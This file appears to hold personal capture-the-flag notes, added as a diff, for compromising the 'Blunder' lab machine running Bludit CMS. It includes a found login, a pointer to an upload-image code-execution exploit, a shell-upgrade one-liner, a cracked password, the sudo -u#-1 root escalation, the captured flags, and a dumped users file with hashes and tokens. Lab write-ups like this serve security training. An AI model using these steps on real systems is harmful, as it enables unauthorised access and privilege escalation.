@@ -1,0 +1,77 @@
+may be user = fergus //found in todo.txt
+
+Use fergus:RolandDeschain to login.
+
+exploit https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec
+
+metasplit not working so using exp.py 
+
+go type shell in the meterpreter session
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+USER: Hugo
+pass: faca404fd5c0a31cf1897b823c695c85cffeb98d(sha-1) -> Password120
+
+su hugo 
+sudo -u#-1 /bin/bash (to enter root)
+
+user tag-> cbf430d09197cc2ae2c7320371dfe611
+root tag-> e0a7429e212f8309054ab06b371ee379
+
+
+
+
+
+webserver details not machine
+"""
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
+cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Admin",
+        "firstName": "Administrator",
+        "lastName": "",
+        "role": "admin",
+        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
+        "salt": "5dde2887e7aca",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""
+    },
+    "fergus": {
+        "firstName": "",
+        "lastName": "",
+        "nickname": "",
+        "description": "",
+        "role": "author",
+        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
+        "salt": "jqxpjfnv",
+        "email": "",
+        "registered": "2019-11-27 13:26:44",
+        "tokenRemember": "",
+        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "codepen": "",
+        "instagram": "",
+        "github": "",
+        "gitlab": "",
+        "linkedin": "",
+        "mastodon": ""
+    }
+}
+"""
+
